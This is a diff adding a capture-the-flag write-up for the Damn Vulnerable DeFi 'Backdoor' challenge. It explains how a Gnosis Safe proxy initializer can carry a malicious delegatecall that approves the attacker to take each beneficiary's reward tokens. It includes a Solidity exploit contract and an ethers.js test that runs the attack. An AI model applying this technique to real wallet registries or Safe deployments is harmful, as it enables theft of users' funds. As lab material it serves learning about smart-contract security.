@@ -1,0 +1,86 @@
+# Challenge #11 - Backdoor
+ To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
+
+ To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
+
+ Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
+
+ Your goal is to take all funds from the registry. In a single transaction.   
+
+## Gnosis Safe Backdoor injection
+In this challenge, we have a vulnerable proxy which allows us to deploy a malicious 
+smart contract executing some initializing code with full proxy admin privileges. That, is 
+going to allow an attacker to steal the eth that the walletRegistry contract gives as a reward 
+for a beneficiary to register.  
+
+The challenge requires to craft the exploit fully in the smart contract in order to execute 
+it in a single transaction. In my example there's multiple transactions as I craft the exploit 
+mostly with ethersjs in the front-end.  
+
+## Exploit 
+In the smart contract I only approve the transfer of tokens:   
+```sol
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+
+interface Itoken {
+	function approve(address,uint) external returns (bool);
+}
+
+contract EXPLOIT_BACKDOOR {
+	function exec(address token, address attacker) external {
+		Itoken(token).approve(attacker, 10 ether);
+	}
+}
+
+```
+Ethers js exploit:  
+```js
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+		// Deploy exploit
+		this.exploit = await (await ethers.getContractFactory('EXPLOIT_BACKDOOR')).deploy();
+		// Initiate byte code to execute
+		const abi = [
+			`function setup(        
+				address[] calldata _owners,
+		        uint256 _threshold,
+		        address to,
+		        bytes calldata data,
+		        address fallbackHandler,
+		        address paymentToken,
+		        uint256 payment,
+				address payable paymentReceiver) external`,
+			"function exec(address, address) external "
+		];
+		const iface = new ethers.utils.Interface(abi);
+		const exploitData = iface.encodeFunctionData("exec", [
+			this.token.address,
+			attacker.address
+		]);
+		// Create proxy for each benefeciary
+		for(let i = 0; i < users.length; i++) {
+		const initializerData = iface.encodeFunctionData("setup", [
+			[users[i]], 
+			1,
+			this.exploit.address,
+			exploitData,
+			ethers.constants.AddressZero,
+			ethers.constants.AddressZero,
+			0,
+			ethers.constants.AddressZero
+		]);
+		const tx = await this.walletFactory.createProxyWithCallback(
+			this.masterCopy.address,
+			initializerData,
+			i,
+			this.walletRegistry.address	
+		);
+		const reciept = await tx.wait();
+		const proxy = reciept.events[2].args.proxy;
+		await this.token.connect(attacker).transferFrom(proxy, attacker.address, ethers.utils.parseEther('10'));
+		}
+    });
+```
+
